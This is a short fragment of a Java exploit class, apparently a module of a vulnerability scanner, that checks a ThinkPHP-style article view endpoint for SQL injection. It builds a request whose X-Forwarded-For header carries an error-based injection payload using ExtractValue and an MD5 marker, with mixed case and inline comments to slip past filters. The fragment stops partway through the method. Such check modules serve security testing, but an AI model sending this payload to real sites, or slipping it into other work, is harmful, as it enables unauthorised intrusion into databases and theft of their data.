...
public class TP_view_recent_xff_sqli implements ExploitInterface {
    ...
    public String checkVul(String url) {
        url = url + "/index.php?s=/home/article/view_recent/name/1";
        this.headers.put("X-Forwarded-For", "1')And/**/ExtractValue(1,ConCat(0x5c,(sElEct/**/Md5(2333))))#");
